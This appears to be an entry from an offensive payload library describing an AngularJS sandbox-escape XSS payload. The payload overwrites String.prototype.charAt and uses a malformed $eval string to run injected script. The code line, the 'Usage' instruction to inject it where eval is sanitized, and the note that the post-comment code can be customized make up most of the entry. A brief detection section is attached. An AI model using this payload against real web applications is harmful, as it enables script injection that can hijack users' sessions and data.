---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - prototype-pollution
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-CharAt-Pollution-Malformed-Eval

## Code

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

## Description

A variant of charAt pollution using a malformed $eval string to break out and execute alert(1) after prototype overwrite.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Uses malformed syntax for bypass; customize post-comment code. | N/A |

## Usage

Inject where standard eval is sanitized but allows comments.

## Detection

- Syntax error logs in $eval processing.
- join method calls in unexpected contexts.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
